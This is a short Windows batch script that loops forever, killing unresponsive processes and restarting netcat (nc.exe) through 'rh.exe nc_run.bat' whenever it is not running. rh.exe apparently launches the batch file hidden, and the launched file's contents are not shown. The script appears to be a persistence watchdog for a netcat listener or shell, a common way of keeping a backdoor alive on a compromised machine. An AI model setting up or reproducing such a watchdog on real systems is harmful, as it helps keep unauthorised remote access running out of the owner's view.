@echo off
:loop
cls
taskkill /f /fi "status eq not responding"
timeout 15
tasklist /FI "IMAGENAME eq nc.exe" 2>NUL | find /I /N "nc.exe">NUL
if NOT "%ERRORLEVEL%" == "0" start rh.exe nc_run.bat
if errorlevel 0 (
        goto loop
)
:end
